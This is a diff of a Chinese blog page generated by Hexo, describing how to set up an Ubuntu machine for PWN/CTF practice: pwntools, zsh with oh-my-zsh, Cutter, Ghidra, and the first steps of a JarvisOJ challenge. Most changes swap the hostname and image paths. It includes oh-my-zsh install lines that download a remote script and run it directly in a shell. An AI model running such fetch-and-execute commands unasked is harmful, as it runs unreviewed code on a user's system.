@@ -17,41 +17,41 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"omicron.fun","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta name="description" content="Ubuntu环境的准备 这就是要完成创建虚拟机，更换源，设置中文，等操作，保证虚拟机处于一个能用的状态  安装x86运行时支持库异常状态 在64位的Linux上运行32位程序的时候会出现这种情况： 执行bin文件时提示：No such file or directory ldd bin文件  的输出为： not a dynamic executable   此时我们可以通过查看文件的运行平台来发">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2020-06-07 与PWN的第一次邂逅~">
-<meta property="og:url" content="http://example.com/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/index.html">
+<meta property="og:url" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Ubuntu环境的准备 这就是要完成创建虚拟机，更换源，设置中文，等操作，保证虚拟机处于一个能用的状态  安装x86运行时支持库异常状态 在64位的Linux上运行32位程序的时候会出现这种情况： 执行bin文件时提示：No such file or directory ldd bin文件  的输出为： not a dynamic executable   此时我们可以通过查看文件的运行平台来发">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-14-17-39.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-14-21-24.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-14-25-20.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-14-27-24.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-14-50-59.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-15-28-57.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-15-58-15.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-16-13-33.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-16-27-32.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-16-30-22.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-16-25-48.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-16-40-48.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-16-44-20.png">
-<meta property="og:image" content="http://example.com/.com//2020-08-03-10-17-14.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-07-17-35-58.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-08-00-12-14.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-08-00-54-37.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-08-00-56-10.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-08-00-59-59.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-08-01-02-24.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-08-01-10-21.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-08-01-12-03.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-08-01-32-14.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-08-01-32-59.png">
-<meta property="og:image" content="http://example.com/.com//2020-06-08-01-48-38.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-14-17-39.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-14-21-24.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-14-25-20.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-14-27-24.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-14-50-59.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-15-28-57.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-15-58-15.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-13-33.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-27-32.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-30-22.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-25-48.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-40-48.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-44-20.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-08-03-10-17-14.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-17-35-58.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-00-12-14.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-00-54-37.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-00-56-10.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-00-59-59.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-02-24.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-10-21.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-12-03.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-32-14.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-32-59.png">
+<meta property="og:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-01-48-38.png">
 <meta property="article:published_time" content="2020-06-07T05:00:12.000Z">
 <meta property="article:modified_time" content="2020-08-05T02:05:02.000Z">
 <meta property="article:author" content="John Doe">
@@ -59,9 +59,9 @@
 <meta property="article:tag" content="PWN">
 <meta property="article:tag" content="环境初始化">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/.com//2020-06-07-14-17-39.png">
+<meta name="twitter:image" content="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-14-17-39.png">
 
-<link rel="canonical" href="http://example.com/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/">
+<link rel="canonical" href="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/">
 
 
 <script id="page-configurations">
@@ -179,7 +179,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/">
+    <link itemprop="mainEntityOfPage" href="http://omicron.fun/2020/06/07/09_PWN/2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -243,16 +243,16 @@
 </ul>
 </li>
 <li>此时我们可以通过查看文件的运行平台来发现问题<ul>
-<li>file bin文件 的输出显示程序是32位<br><img src="/.com//2020-06-07-14-17-39.png" alt="file pwn"></li>
-<li>readelf bin文件 的系统架构显示为<code>Intel 80386</code><br><img src="/.com//2020-06-07-14-21-24.png" alt="readelf pwn -all"></li>
+<li>file bin文件 的输出显示程序是32位<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-14-17-39.png" alt="file pwn"></li>
+<li>readelf bin文件 的系统架构显示为<code>Intel 80386</code><br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-14-21-24.png" alt="readelf pwn -all"></li>
 </ul>
 </li>
 </ul>
 <h3 id="解决方式：安装-ia32-libs"><a href="#解决方式：安装-ia32-libs" class="headerlink" title="解决方式：安装 ia32-libs"></a>解决方式：安装 ia32-libs</h3><ul>
 <li>打开多架构支持，然后直接下载对应的包<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg –add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ia32-libs</span><br></pre></td></tr></table></figure></li>
-<li>然后你就会惊喜的发现<br><img src="/.com//2020-06-07-14-25-20.png" alt="ia32被弃用"></li>
+<li>然后你就会惊喜的发现<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-14-25-20.png" alt="ia32被弃用"></li>
 <li>所以我们下载提示中用来取代他的软件包<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install lib32ncurses5 lib32z1</span><br></pre></td></tr></table></figure></li>
-<li>再次启动对应的程序就可以正常运行了<br><img src="/.com//2020-06-07-14-27-24.png" alt="正常运行"></li>
+<li>再次启动对应的程序就可以正常运行了<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-14-27-24.png" alt="正常运行"></li>
 <li>补充<ul>
 <li>2020.08.02时尝试依然不能运行，故做出以下修改</li>
 <li><code>sudo apt install qemu-user-static</code></li>
@@ -276,21 +276,21 @@
 </ul>
 <h2 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h2><ul>
 <li>pwntools 实际上是python的一个库，直接下载，可以指定源，来加速下载。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools -i https://pypi.mirrors.ustc.edu.cn/simple</span><br></pre></td></tr></table></figure>
-下载的内容很多<br><img src="/.com//2020-06-07-14-50-59.png"></li>
-<li>然后可以测试一下，是不是OK了<br><img src="/.com//2020-06-07-15-28-57.png"></li>
+下载的内容很多<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-14-50-59.png"></li>
+<li>然后可以测试一下，是不是OK了<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-15-28-57.png"></li>
 </ul>
 <h2 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h2><ul>
 <li>实际上直接用 oh-my-zsh 脚本就解决了很多问题</li>
 </ul>
 <h3 id="下载zsh"><a href="#下载zsh" class="headerlink" title="下载zsh"></a>下载zsh</h3><ul>
-<li>可以先查看一下系统的shell：<code>echo $SHELL</code><br><img src="/.com//2020-06-07-15-58-15.png"></li>
+<li>可以先查看一下系统的shell：<code>echo $SHELL</code><br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-15-58-15.png"></li>
 <li>首先下载zsh：<code>apt-get install zsh</code></li>
 <li>然后修改zsh为系统默认的shell：<code>chsh -s /bin/zsh</code></li>
-<li>直接重启虚拟机，重新进入界面之后就是zsh命令行了，可以验证<br><img src="/.com//2020-06-07-16-13-33.png"></li>
+<li>直接重启虚拟机，重新进入界面之后就是zsh命令行了，可以验证<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-13-33.png"></li>
 <li>这个时候的zsh真的丑…</li>
 </ul>
 <h3 id="美化和配置zsh"><a href="#美化和配置zsh" class="headerlink" title="美化和配置zsh"></a>美化和配置zsh</h3><h4 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h4><ul>
-<li>下载的时候疯狂被墙，莫得办法，就去改hosts来绕过了<br><img src="/.com//2020-06-07-16-27-32.png"></li>
+<li>下载的时候疯狂被墙，莫得办法，就去改hosts来绕过了<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-27-32.png"></li>
 <li>去<a target="_blank" rel="noopener" href="https://www.ipaddress.com/">IpAddress</a>这里查询以下3个域名的ip地址加入到hosts中<ul>
 <li>github.com</li>
 <li>github.global.ssl.fastly.net</li>
@@ -298,10 +298,10 @@
 </ul>
 </li>
 <li>打开hosts的方式：<code>sudo gedit /etc/hosts</code></li>
-<li>差不多就是这样<br><img src="/.com//2020-06-07-16-30-22.png"><h4 id="下载oh-my-zsh"><a href="#下载oh-my-zsh" class="headerlink" title="下载oh-my-zsh"></a>下载oh-my-zsh</h4></li>
+<li>差不多就是这样<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-30-22.png"><h4 id="下载oh-my-zsh"><a href="#下载oh-my-zsh" class="headerlink" title="下载oh-my-zsh"></a>下载oh-my-zsh</h4></li>
 <li>这里就需要使用oh-my-zsh</li>
 <li>首先选择自己的方式下载<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> or</span></span><br><span class="line">sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</span><br></pre></td></tr></table></figure></li>
-<li>成功之后就是这样<br><img src="/.com//2020-06-07-16-25-48.png"></li>
+<li>成功之后就是这样<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-25-48.png"></li>
 </ul>
 <h4 id="个性化配置"><a href="#个性化配置" class="headerlink" title="个性化配置"></a>个性化配置</h4><ul>
 <li>修改主题：<code>vim ~/.zshrc</code><ul>
@@ -310,19 +310,19 @@
 <li>我采用的是<code>rkj-repos</code></li>
 </ul>
 </li>
-<li>首先<code>vim ~/.zshrc</code>，修改对应的theme<br><img src="/.com//2020-06-07-16-40-48.png"></li>
+<li>首先<code>vim ~/.zshrc</code>，修改对应的theme<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-40-48.png"></li>
 <li>然后下载专业的字体：<code>fonts-powerline</code></li>
 <li>有这种字体才能支持一些很漂亮的样式<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install powerline fonts-powerline</span><br></pre></td></tr></table></figure></li>
-<li>效果差不多是这样的<br><img src="/.com//2020-06-07-16-44-20.png"></li>
+<li>效果差不多是这样的<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-16-44-20.png"></li>
 </ul>
 <h4 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h4><ul>
 <li><del>安装incr自动补全插件</del><br>严重怀疑这个是不是来干扰我使用的<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.oh-my-zsh/custom/plugins</span><br><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions</span><br><span class="line"><span class="meta">#</span><span class="bash"> 然后修改 .zshrc 文件</span></span><br><span class="line">plugins=(</span><br><span class="line">  git </span><br><span class="line">+ zsh-autosuggestions</span><br><span class="line">)</span><br><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure></li>
 <li>安装zsh-syntax-highlighting语法高亮插件<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.oh-my-zsh/custom/plugins</span><br><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git</span><br><span class="line">plugins=(</span><br><span class="line">  git </span><br><span class="line">+ zsh-syntax-highlighting</span><br><span class="line">)</span><br><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure></li>
-<li>就酱紫~<br><img src="/.com//2020-08-03-10-17-14.png"></li>
+<li>就酱紫~<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-08-03-10-17-14.png"></li>
 </ul>
 <h2 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h2><ul>
 <li>直接使用<code>java -version</code>，查看当前java版本，没有java就下载<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install default-jre</span><br><span class="line">sudo apt install default-jdk</span><br></pre></td></tr></table></figure></li>
-<li>第一个安装之后就拥有了java虚拟机，但是有的时候可能需要jdk，所以两个一起都安装好<br><img src="/.com//2020-06-07-17-35-58.png"></li>
+<li>第一个安装之后就拥有了java虚拟机，但是有的时候可能需要jdk，所以两个一起都安装好<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-07-17-35-58.png"></li>
 </ul>
 <h1 id="安装调试工具"><a href="#安装调试工具" class="headerlink" title="安装调试工具"></a>安装调试工具</h1><ul>
 <li>直接上神器，Windows上用IDA没得说，Linux上的开源神器radare 更是神奇</li>
@@ -332,7 +332,7 @@
 <h2 id="安装-Cutter"><a href="#安装-Cutter" class="headerlink" title="安装 Cutter"></a>安装 Cutter</h2><ul>
 <li>Cutter是GUI版的radare</li>
 <li>直接去下载即可，<a target="_blank" rel="noopener" href="https://github.com/radareorg/cutter/releases">DownLoad Cutter （GitHub）</a></li>
-<li>下载Linux版，在命令行下添加可执行属性<br><code>chmod +x Cutter-v1.10.3-x64.Linux.AppImage</code><br>然后可以直接运行了，选择文件导入，分析程度拉满！<br><img src="/.com//2020-06-08-00-12-14.png"><br>用起来还是相当厉害的！</li>
+<li>下载Linux版，在命令行下添加可执行属性<br><code>chmod +x Cutter-v1.10.3-x64.Linux.AppImage</code><br>然后可以直接运行了，选择文件导入，分析程度拉满！<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-00-12-14.png"><br>用起来还是相当厉害的！</li>
 </ul>
 <h2 id="安装-Ghidra"><a href="#安装-Ghidra" class="headerlink" title="安装 Ghidra"></a><del>安装 Ghidra</del></h2><ul>
 <li>Ghidra是由美国国家安全局（NSA）研究部门开发的软件逆向工程（SRE）套件，用于支持网络安全任务。</li>
@@ -342,17 +342,17 @@
 </ul>
 <h1 id="PWN的初体验"><a href="#PWN的初体验" class="headerlink" title="PWN的初体验"></a>PWN的初体验</h1><ul>
 <li>题目链接：<a target="_blank" rel="noopener" href="https://www.jarvisoj.com/challenges">JarvisOJ</a></li>
-<li>最简单的一题：level0<br><img src="/.com//2020-06-08-00-54-37.png"></li>
-<li>下载好先运行看看<br><img src="/.com//2020-06-08-00-56-10.png"></li>
-<li>简单来说就是打印一个<code>Hello World</code>然后就等待输入，接着程序就结束了，首先检查一下这个程序，看看开启了什么保护<br><code>checksec level0</code><br><img src="/.com//2020-06-08-00-59-59.png"></li>
-<li>只有栈代码不可执行这个保护是开启的状态，下一步，反编译<br><img src="/.com//2020-06-08-01-02-24.png"><br>顺便记住，这是个x64程序</li>
+<li>最简单的一题：level0<br><img src="2020-06-07-%E4%B8%8EPWN%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%82%82%E9%80%85/2020-06-08-00-54-37.png"></li>
